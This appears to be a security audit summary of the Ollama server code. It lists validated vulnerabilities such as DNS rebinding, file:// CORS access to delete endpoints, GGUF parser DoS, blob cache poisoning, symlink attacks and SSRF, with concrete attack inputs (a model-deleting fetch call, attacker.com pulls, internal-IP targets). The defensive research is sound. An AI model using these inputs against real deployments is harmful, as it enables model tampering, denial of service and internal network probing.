# Deep Probe Summary: Team-01 (DFD-1 + CFD-1)

Status: complete
Loops: 1
Total hypotheses: 26 (PH-01 through PH-26)
Validated: 22
Needs-Deeper: 2 (PH-07, PH-13 — partially resolved, noted below)
Invalidated: 1 (PH-17 — fails closed, not a vulnerability)
Informational: 1 (PH-14 — low-severity options oracle)
Stop reason: All entry points covered; no fragile items; NEEDS-DEEPER items resolved to medium-confidence by Round 3 causal analysis

---

## Validated Hypotheses

### PH-01: DNS Rebinding Reaches /api/pull via registry.Local — No Host Validation
- Reasoning-Model: Pre-Mortem (backward-reasoner)
- Target: `server/internal/registry/server.go:118-121` — `serveHTTP` switch case `/api/pull`
- Attack input: DNS-rebinding HTTP POST to `/api/pull` with `{"model":"attacker.com/malicious:latest"}`
- Code path: DNS rebind → `registry.Local.ServeHTTP:108` → `serveHTTP:113` → case `/api/pull` → `handlePull:259` → `s.Client.Pull` [gin middleware never called]
- Sanitizers on path: NONE — `allowedHostsMiddleware` never invoked; `handlePull` only checks HTTP method
- Security consequence: Attacker-controlled model downloaded; if GGUF triggers parser CVE → DoS/crash; if ENTRYPOINT present (parth/agents branch) → RCE
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md, round-3-hypotheses.md (PH-19)

### PH-02: file:// Origin Reaches All Destructive Endpoints — No Auth
- Reasoning-Model: Pre-Mortem (backward-reasoner)
- Target: `envconfig/config.go:99` — `AllowedOrigins` hardcodes `file://*`
- Attack input: Local HTML file with `fetch('http://localhost:11434/api/delete', {method:'DELETE', body:'{"model":"llama3"}'})`
- Code path: Browser → CORS passes (file:// allowed) → Host passes (localhost) → gin DeleteHandler OR registry.Local.handleDelete → model deleted
- Sanitizers on path: CORS (passes), allowedHostsMiddleware (passes for loopback). No auth on any endpoint.
- Security consequence: Silent deletion of all local models; combinable with PH-01 to replace deleted models with attacker variants
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-03: GGUF Unbounded String Allocation → OOM DoS
- Reasoning-Model: Abductive (backward-reasoner)
- Target: `fs/ggml/gguf.go:359-361` — `readGGUFString`
- Attack input: GGUF file with KV string value claiming length 0x7FFFFFFFFFFFFFFF; uploaded via `POST /api/blobs/:digest`, then `POST /api/create`
- Code path: blob upload → `POST /api/create` → GGUF parse → `gguf.Decode:143` → `readGGUFString:361` → `make([]byte, 9223372036854775807)` → OOM panic → gin recovery → HTTP 500
- Sanitizers on path: None before `make`. Gin recovery prevents full process crash; causes per-request DoS.
- Security consequence: Reliable per-request DoS; repeated requests can exhaust system memory
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md, round-3-hypotheses.md (PH-22)

### PH-04: GGUF ggufPadding Divide-by-Zero → Per-Request DoS
- Reasoning-Model: Abductive (backward-reasoner)
- Target: `fs/ggml/gguf.go:238-245` — alignment from KV → `ggufPadding`
- Attack input: GGUF with KV key `general.alignment` = 0
- Code path: GGUF parse → `kv.Uint("general.alignment", 32)` returns 0 (key present) → `ggufPadding(offset, 0)` → `offset % 0` → runtime panic → gin recovery → HTTP 500
- Sanitizers on path: Gin recovery middleware catches panic. No guard on alignment value from KV.
- Security consequence: Per-request DoS; gin recovery prevents process crash
- Severity estimate: MEDIUM-HIGH
- Evidence file: round-1-evidence.md, round-3-hypotheses.md (PH-21)

### PH-05: Blob Cache Poisoning — Same-Size Malicious GGUF Bypasses Hash Check
- Reasoning-Model: Pre-Mortem (backward-reasoner)
- Target: `server/download.go:478` — `os.Stat(fp)` as cache-hit gate; `server/internal/cache/blob/cache.go:457-464` — `copyNamedFile` size-match skip
- Attack input: Attacker (local co-tenant) writes same-size malicious GGUF to blob path
- Code path: Attacker replaces blob → victim runs `ollama run model` → `downloadBlob:478` returns `cacheHit=true` → `verifyBlob` skipped (images.go:640) → malicious GGUF loaded
- Sanitizers on path: `BlobsPath` validates digest format only. Two cache paths both skip hash on existence/size match.
- Security consequence: Arbitrary GGUF loaded; enables all GGUF CVE classes; blob directory is 0o777 (new cache) enabling world-write
- Severity estimate: HIGH (multi-user systems)
- Evidence file: round-1-evidence.md

### PH-06: SSRF via /api/pull with Internal URL as Model Name
- Reasoning-Model: Abductive (backward-reasoner)
- Target: `server/images.go:835-836` — `pullModelManifest` constructs registry URL from model name host component
- Attack input: `POST /api/pull` body `{"model":"192.168.1.1:8080/internal/model:latest"}`
- Code path: `PullHandler` → `PullModel` → `pullModelManifest` → `n.BaseURL().JoinPath(...)` → HTTP GET to internal IP
- Sanitizers on path: `parseNormalizePullModelRef` validates name format but NOT target IP. No SSRF protection.
- Security consequence: SSRF to internal network services; metadata service access (169.254.169.254); potential internal service enumeration
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-08: OLLAMA_HOST=0.0.0.0 Fully Disables allowedHostsMiddleware
- Reasoning-Model: Pre-Mortem (backward-reasoner)
- Target: `server/routes.go:1607-1609` — non-loopback unconditional skip
- Attack input: Direct HTTP request from remote client to port 11434
- Code path: TCP → gin middleware → `allowedHostsMiddleware` checks `!addr.Addr().IsLoopback()` → true for 0.0.0.0 → `c.Next()` immediately → handler
- Sanitizers on path: None when OLLAMA_HOST is non-loopback
- Security consequence: Fully open unauthenticated API accessible from network; extremely common in Docker deployments
- Severity estimate: CRITICAL (in Docker/remote deployments)
- Evidence file: round-1-evidence.md

### PH-09: AllowedOrigins Cannot Be Restricted — file://* Is Permanent
- Reasoning-Model: TRIZ (contradiction-reasoner)
- Target: `envconfig/config.go:99-105` — unconditional append of dangerous origins
- Attack input: Any file://-based attack
- Security consequence: Design flaw — operators cannot harden CORS by removing `file://*`; combined with no-auth API, all browser-accessible file:// pages have permanent destructive API access
- Severity estimate: HIGH (design-level gap)
- Evidence file: round-1-evidence.md

### PH-10: registry.Local Creates Permanent Split Security Model
- Reasoning-Model: Game-Theory (contradiction-reasoner)
- Target: `server/routes.go:1727-1736`; `server/internal/registry/server.go:116-128`
- Security consequence: Any gin middleware added for `/api/pull` and `/api/delete` (including future auth) will NOT protect these endpoints as long as `rc != nil` and `registry.Local` is the root handler
- Severity estimate: HIGH (systemic)
- Evidence file: round-1-evidence.md, round-3-hypotheses.md (PH-19)

### PH-11: Symlink Attack on Blob Cache — os.Stat Follows Symlinks
- Reasoning-Model: Assumption Inversion (contradiction-reasoner)
- Target: `server/download.go:478` — `os.Stat(fp)`; `server/internal/cache/blob/cache.go:259` — `DiskCache.Get`
- Attack input: Attacker creates symlink at blob path pointing to malicious GGUF
- Code path: Symlink at blob path → `os.Stat` follows symlink → succeeds → `cacheHit=true` (old path) or `c.Get` size match (new path) → layer skipped → malicious GGUF loaded
- Sanitizers on path: None. `os.Stat` is symlink-following by design. No `os.Lstat` anywhere.
- Security consequence: Stronger than PH-05 — no size constraint on old path; persists across future pulls; blob directory is 0o777
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md, round-3-hypotheses.md (PH-20, PH-23, PH-24)

### PH-12: GGUF numKV Loop Without Upper Bound — Bounded DoS
- Reasoning-Model: TRIZ (contradiction-reasoner)
- Target: `fs/ggml/gguf.go:143` — KV loop; `fs/ggml/gguf.go:194` — tensor loop
- Attack input: GGUF with large numKV value (bounded DoS — exits at EOF)
- Security consequence: DoS bounded by file size; less severe than PH-03
- Severity estimate: MEDIUM
- Evidence file: round-3-hypotheses.md (PH-26)

### PH-15: HTTP Pull Accepted Without Insecure Flag via registry.Local Path
- Reasoning-Model: Assumption Inversion (contradiction-reasoner)
- Target: `server/internal/client/ollama/registry.go:1105-1108` — `supportedSchemes`; absence of TLS check in `handlePull`
- Attack input: `POST /api/pull` (via registry.Local) with `{"model":"http://attacker.com/model:tag"}` — no `insecure: true` needed
- Code path: registry.Local.handlePull → `s.Client.Pull` → `parseNameExtended` accepts `http://` scheme → outbound HTTP to attacker.com (no TLS)
- Sanitizers on path: Old `PullModel` path checks `regOpts.Insecure`. New `Registry.Pull` path accepts `http://` without flag.
- Security consequence: HTTP pull enables MITM on model download; combined with size-match cache skip (PH-20), delivers unverified GGUF
- Severity estimate: MEDIUM-HIGH
- Evidence file: round-3-hypotheses.md (PH-25)

### PH-16 (modified): pullWithTransfer Cache-Hit Skip Extends Symlink Attack to All Models
- Reasoning-Model: TRIZ (contradiction-reasoner)
- Target: `x/imagegen/transfer/download.go:57-58` — `os.Stat` + size-match for cache hit
- Note: Fresh downloads ARE SHA-256 verified by x/transfer. Cache hits are NOT.
- Code path: `pullWithTransfer` → `transfer.Download` → blob exists with matching size → skip download → load unverified content
- Sanitizers on path: Fresh-download path has SHA-256 verification. Cache-hit path has only size-match.
- Security consequence: Symlink attack (PH-11) also covers tensor-layer models pulled via `pullWithTransfer` — all modern LLMs affected
- Severity estimate: HIGH (extends PH-11 to cover all pull code paths)
- Evidence file: round-3-hypotheses.md (PH-23)

### PH-18: Dual Pull Implementations Create Security Regression Risk
- Reasoning-Model: Game-Theory (contradiction-reasoner)
- Target: Architecture spanning `server/routes.go` and `server/internal/registry/server.go`
- Security consequence: Security fixes to `PullHandler`/`PullModel` will not automatically protect `registry.Local.handlePull`; requires manual mirroring
- Severity estimate: MEDIUM (systemic maintenance risk)
- Evidence file: round-2-hypotheses.md

---

## NEEDS-DEEPER

### PH-07: registry.Local.handlePull Model Name Normalization Gap
- Why unresolved: `Registry.Pull` uses `parseNameExtended` → `parseName`, which validates structure. The normalization steps unique to `PullHandler` (cloud-model suffix handling, `getExistingName`) are absent. Whether this creates an exploitable behavioral differential requires understanding all normalization effects and whether any can be weaponized.
- Suggested follow-up: Phase 8 should compare `parseNormalizePullModelRef` + `getExistingName` against `registry.parseName` for any case where the same input string produces different model name resolution outcomes. Specifically: can a name be crafted that `parseName` resolves to a different registry/path than `parseNormalizePullModelRef` would?

### PH-13: Handler Differential Between Two /api/pull Implementations
- Why unresolved: Confirmed that normalization differs between paths. Not confirmed whether any normalization gap enables exploitable name confusion (e.g., path traversal variant that survives `parseName` but would be blocked by `parseNormalizePullModelRef`).
- Suggested follow-up: Differential fuzzing of model name parsing between the two paths. Focus on: special characters, Unicode, double-encoded path separators, cloud suffix variants.

---

## Coverage Summary

| Entry Point | backward-reasoner | contradiction-reasoner | causal-verifier |
|---|:---:|:---:|:---:|
| registry.Local /api/pull (no middleware) | PH-01 | PH-10 | PH-19 |
| registry.Local /api/delete (no middleware) | PH-02 | PH-10 | PH-19 |
| CORS file://* origin | PH-02 | PH-09 | — |
| allowedHostsMiddleware skip (non-loopback) | PH-08 | — | — |
| PullHandler → PullModel → downloadBlob | PH-06, PH-05 | PH-16, PH-15 | PH-23, PH-25 |
| GGUF parser (string alloc) | PH-03 | PH-12 | PH-22, PH-26 |
| GGUF parser (divide-by-zero) | PH-04 | — | PH-21 |
| Blob cache integrity skip | PH-05 | PH-11 | PH-20, PH-24 |
| AllowedOrigins irremovable defaults | PH-02 | PH-09 | — |
| HTTP pull without insecure flag | — | PH-15 | PH-25 |
| Dual handler security regression risk | — | PH-18 | — |
